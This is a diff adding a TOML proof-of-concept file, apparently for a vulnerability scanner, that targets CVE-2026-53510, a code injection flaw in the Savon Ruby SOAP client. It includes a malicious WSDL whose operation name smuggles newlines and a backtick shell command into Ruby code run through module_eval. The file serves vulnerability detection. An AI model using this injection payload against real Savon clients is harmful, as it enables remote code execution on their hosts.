@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "验证 Savon::Model .all_operations 方法将 WSDL 操作名称拼接为 Ruby 源码传入 module_eval 导致的代码注入漏洞。通过提供包含恶意操作名称的 WSDL 文档，检测目标 Savon 客户端是否执行了注入的 Ruby 代码。"
+id = "POC-AVE-2026-0771"
+name = "CVE-2026-53510 Savon Ruby SOAP Client RCE PoC"
+severity = "high"
+tags = ["ave-2026-0771"]
+vuln_id = [
+    "CVE-2026-53510",
+    "AVE-2026-0771",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wsdl/evil.wsdl"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0"?>
+<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"
+                  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
+                  name="EvilService" targetNamespace="urn:evil">
+  <wsdl:binding name="EvilBinding" type="wsdl:EvilPort">
+    <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
+    <wsdl:operation name="foo&#10;end&#10;`echo exploited`&#10;def x">
+      <soap:operation soapAction="urn:evil#foo"/>
+    </wsdl:operation>
+  </wsdl:binding>
+</wsdl:definitions>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["wsdl:definitions"]
